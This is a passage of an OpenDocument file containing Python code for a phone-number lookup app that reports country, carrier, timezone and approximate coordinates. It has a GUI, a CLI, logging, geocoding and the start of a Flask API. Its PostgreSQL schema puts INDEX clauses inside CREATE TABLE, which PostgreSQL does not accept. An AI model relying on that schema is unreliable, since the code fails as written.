      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>self.results_text.insert(tk.END, f"{result.latitude:.6f}\n", 'value')</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>self.results_text.insert(tk.END, "Longitude: ", 'label')</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>self.results_text.insert(tk.END, f"{result.longitude:.6f}\n", 'value')</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>self.results_text.insert(tk.END, "\n📍 Approximate city-level location\n", 'success')</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/># Timestamp</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>self.results_text.insert(tk.END, "\n⏱️ Lookup performed: ", 'label')</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>self.results_text.insert(tk.END, f"{result.lookup_timestamp}\n", 'value')</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>def clear_input(self):</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>"""Clear input field and reset display."""</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>self.phone_var.set("+255")</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>self.current_result = None</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>self.copy_button.config(state=tk.DISABLED)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>self.map_button.config(state=tk.DISABLED)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>self.save_button.config(state=tk.DISABLED)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>self.show_welcome()</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>self.status_var.set("Ready")</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>def copy_results(self):</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>"""Copy results to clipboard."""</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>if not self.current_result:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>return</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>text = self.results_text.get(1.0, tk.END).strip()</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>self.root.clipboard_clear()</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>self.root.clipboard_append(text)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>self.status_var.set("Results copied to clipboard")</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>def open_in_maps(self):</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>"""Open location in Google Maps."""</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>if not self.current_result or not self.current_result.latitude:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>return</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:soft-page-break/><text:s text:c="8"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>lat = self.current_result.latitude</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>lon = self.current_result.longitude</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>url = f"https://www.google.com/maps?q={lat},{lon}"</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>webbrowser.open(url)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>self.status_var.set(f"Opened in Google Maps: {lat:.4f}, {lon:.4f}")</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>def save_to_history(self):</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>"""Save current lookup to history file."""</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>if not self.current_result:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>return</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>try:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>import json</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>from datetime import datetime</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>history_entry = {</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="16"/>"timestamp": datetime.now().isoformat(),</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="16"/>"number": self.current_result.raw_number,</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="16"/>"result": self.current_result.to_dict()</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>}</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/># Append to history file</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>with open("data/history/lookups.json", "a") as f:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="16"/>f.write(json.dumps(history_entry) + "\n")</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>self.status_var.set("Saved to history")</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>except Exception as e:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>logger.error(f"Failed to save history: {e}")</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>messagebox.showerror("Error", f"Could not save: {str(e)}")</text:p>
      <text:p text:style-name="Preformatted_20_Text">File: src/main.py (Entry Point)</text:p>
      <text:p text:style-name="Preformatted_20_Text">#!/usr/bin/env python3</text:p>
      <text:p text:style-name="Preformatted_20_Text">"""</text:p>
      <text:p text:style-name="Preformatted_20_Text">J Phone NoTracker - Main Entry Point</text:p>
      <text:p text:style-name="Preformatted_20_Text">Phone number intelligence and geolocation application.</text:p>
      <text:p text:style-name="Preformatted_20_Text">"""</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">import sys</text:p>
      <text:p text:style-name="Preformatted_20_Text">import os</text:p>
      <text:p text:style-name="Preformatted_20_Text">import argparse</text:p>
      <text:p text:style-name="Preformatted_20_Text">import logging</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"># Add project root to path</text:p>
      <text:p text:style-name="Preformatted_20_Text">sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">from src.gui.window import PhoneTrackerGUI</text:p>
      <text:p text:style-name="Preformatted_20_Text">from src.utils.logger import setup_logging</text:p>
      <text:p text:style-name="Preformatted_20_Text">from src.core.tracker import get_tracker</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">def parse_arguments():</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>"""Parse command line arguments."""</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>parser = argparse.ArgumentParser(</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>description="J Phone NoTracker - Phone Number Intelligence"</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>parser.add_argument(</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>"--no-gui",</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>action="store_true",</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>help="Run in command-line mode (no GUI)"</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:soft-page-break/><text:s text:c="4"/>)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>parser.add_argument(</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>"phone_number",</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>nargs="?",</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>help="Phone number to track (for CLI mode)"</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>parser.add_argument(</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>"--offline",</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>action="store_true",</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>help="Disable online geocoding (use only offline databases)"</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>parser.add_argument(</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>"--verbose",</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>"-v",</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>action="store_true",</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>help="Enable verbose logging"</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>return parser.parse_args()</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">def cli_mode(args):</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>"""Run in command-line mode."""</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>if not args.phone_number:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>print("Error: Phone number required in CLI mode")</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>print("Usage: python main.py --no-gui +255712345678")</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>return 1</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/># Configure logging</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>log_level = logging.DEBUG if args.verbose else logging.INFO</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>setup_logging(level=log_level)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/># Create tracker</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>tracker = get_tracker()</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>tracker.use_online_geocoding = not args.offline</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>print(f"🔍 Tracking: {args.phone_number}")</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>print("-" * 50)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/># Perform tracking</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>result = tracker.track(args.phone_number)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/># Display results</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>if not result.valid:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>print("❌ Invalid phone number")</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>return 1</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>print(f"📱 Number: {result.raw_number}")</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>print(f"🌍 Country: {result.country_name}")</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>if result.location and result.location != result.country_name:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>print(f"📍 Location: {result.location}")</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>print(f"📡 Carrier: {result.carrier_name or 'Unknown'}")</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>print(f"⏰ Timezone: {result.timezones[0] if result.timezones else 'Unknown'}")</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>if result.local_time:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>print(f"🕐 Local Time: {result.local_time}")</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>if result.latitude and result.longitude:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>print(f"🗺️ Coordinates: {result.latitude:.6f}, {result.longitude:.6f}")</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>return 0</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"><text:soft-page-break/></text:p>
      <text:p text:style-name="Preformatted_20_Text">def gui_mode(args):</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>"""Run in GUI mode."""</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/># Configure logging</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>log_level = logging.DEBUG if args.verbose else logging.INFO</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>setup_logging(level=log_level)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/># Configure tracker settings</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>tracker = get_tracker()</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>tracker.use_online_geocoding = not args.offline</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/># Launch GUI</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>import tkinter as tk</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>root = tk.Tk()</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>app = PhoneTrackerGUI(root)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/># Auto-track if number provided</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>if args.phone_number:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>app.phone_var.set(args.phone_number)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>app.track_number()</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>root.mainloop()</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>return 0</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">def main():</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>"""Main entry point."""</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>args = parse_arguments()</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>if args.no_gui:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>return cli_mode(args)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>else:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>return gui_mode(args)</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">if __name__ == "__main__":</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>sys.exit(main())</text:p>
      <text:p text:style-name="Preformatted_20_Text">File: src/utils/logger.py (Logging Configuration)</text:p>
      <text:p text:style-name="Preformatted_20_Text">"""</text:p>
      <text:p text:style-name="Preformatted_20_Text">Logging configuration for the application.</text:p>
      <text:p text:style-name="Preformatted_20_Text">"""</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">import logging</text:p>
      <text:p text:style-name="Preformatted_20_Text">import os</text:p>
      <text:p text:style-name="Preformatted_20_Text">from logging.handlers import RotatingFileHandler</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">def setup_logging(</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>log_dir: str = "logs",</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>log_file: str = "app.log",</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>level: int = logging.INFO,</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>max_bytes: int = 10_485_760, <text:s/># 10MB</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>backup_count: int = 5</text:p>
      <text:p text:style-name="Preformatted_20_Text">):</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>"""</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>Configure application logging.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>Args:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>log_dir: Directory for log files</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:soft-page-break/><text:s text:c="8"/>log_file: Log file name</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>level: Logging level</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>max_bytes: Maximum log file size before rotation</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>backup_count: Number of backup files to keep</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>"""</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/># Create log directory if needed</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>os.makedirs(log_dir, exist_ok=True)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>log_path = os.path.join(log_dir, log_file)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/># Configure root logger</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>logger = logging.getLogger()</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>logger.setLevel(level)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/># Remove existing handlers</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>for handler in logger.handlers[:]:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>logger.removeHandler(handler)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/># File handler with rotation</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>file_handler = RotatingFileHandler(</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>log_path,</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>maxBytes=max_bytes,</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>backupCount=backup_count</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>file_handler.setLevel(level)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>file_format = logging.Formatter(</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>'%(asctime)s - %(name)s - %(levelname)s - %(message)s'</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>file_handler.setFormatter(file_format)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>logger.addHandler(file_handler)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/># Console handler</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>console_handler = logging.StreamHandler()</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>console_handler.setLevel(level)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>console_format = logging.Formatter(</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>'%(levelname)s: %(message)s'</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>console_handler.setFormatter(console_format)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>logger.addHandler(console_handler)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>return logger</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">def get_logger(name: str) -&gt; logging.Logger:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>"""Get a logger instance."""</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>return logging.getLogger(name)</text:p>
      <text:p text:style-name="Preformatted_20_Text">4. Real-World Integration</text:p>
      <text:p text:style-name="Preformatted_20_Text">4.1 API Integration for Enhanced Data</text:p>
      <text:p text:style-name="Preformatted_20_Text">While J Phone NoTracker primarily uses offline databases, real-world production systems typically integrate with multiple data sources:</text:p>
      <text:p text:style-name="Preformatted_20_Text"># Example of integrating with multiple geocoding APIs</text:p>
      <text:p text:style-name="Preformatted_20_Text">class GeocodingService:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>def __init__(self):</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>self.providers = [</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>NominatimGeocoder(), <text:s/># OpenStreetMap</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>GoogleGeocoder(api_key=os.getenv("GOOGLE_MAPS_API")),</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>HereGeocoder(api_key=os.getenv("HERE_API")),</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>]</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:soft-page-break/><text:s text:c="4"/>def geocode(self, location):</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>for provider in self.providers:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>try:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="16"/>result = provider.geocode(location)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="16"/>if result:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="20"/>return result</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>except Exception:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="16"/>continue</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>return None</text:p>
      <text:p text:style-name="Preformatted_20_Text">4.2 Database Integration for History and Analytics</text:p>
      <text:p text:style-name="Preformatted_20_Text">-- PostgreSQL schema for tracking history</text:p>
      <text:p text:style-name="Preformatted_20_Text">CREATE TABLE phone_lookups (</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>id BIGSERIAL PRIMARY KEY,</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>phone_number VARCHAR(20) NOT NULL,</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>country_code INTEGER,</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>national_number BIGINT,</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>country_name VARCHAR(100),</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>location_name VARCHAR(200),</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>carrier_name VARCHAR(100),</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>latitude DECIMAL(10,8),</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>longitude DECIMAL(11,8),</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>timezones TEXT[],</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>lookup_time TIMESTAMP WITH TIME ZONE DEFAULT NOW(),</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>client_ip INET,</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>user_agent TEXT,</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>INDEX idx_phone_number (phone_number),</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>INDEX idx_lookup_time (lookup_time),</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>INDEX idx_country (country_name)</text:p>
      <text:p text:style-name="Preformatted_20_Text">);</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">-- Analytics query: most tracked carriers</text:p>
      <text:p text:style-name="Preformatted_20_Text">SELECT carrier_name, COUNT(*) as count</text:p>
      <text:p text:style-name="Preformatted_20_Text">FROM phone_lookups</text:p>
      <text:p text:style-name="Preformatted_20_Text">WHERE lookup_time &gt; NOW() - INTERVAL '30 days'</text:p>
      <text:p text:style-name="Preformatted_20_Text">GROUP BY carrier_name</text:p>
      <text:p text:style-name="Preformatted_20_Text">ORDER BY count DESC;</text:p>
      <text:p text:style-name="Preformatted_20_Text">4.3 REST API Implementation</text:p>
      <text:p text:style-name="Preformatted_20_Text">For integration with other services, expose the functionality via REST API:</text:p>
      <text:p text:style-name="Preformatted_20_Text"># Flask-based API endpoint</text:p>
      <text:p text:style-name="Preformatted_20_Text">from flask import Flask, request, jsonify</text:p>
      <text:p text:style-name="Preformatted_20_Text">from src.core.tracker import PhoneNumberTracker</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">app = Flask(__name__)</text:p>
      <text:p text:style-name="Preformatted_20_Text">tracker = PhoneNumberTracker()</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">@app.route('/api/v1/track', methods=['POST'])</text:p>
      <text:p text:style-name="Preformatted_20_Text">def track_phone():</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>data = request.get_json()</text:p>
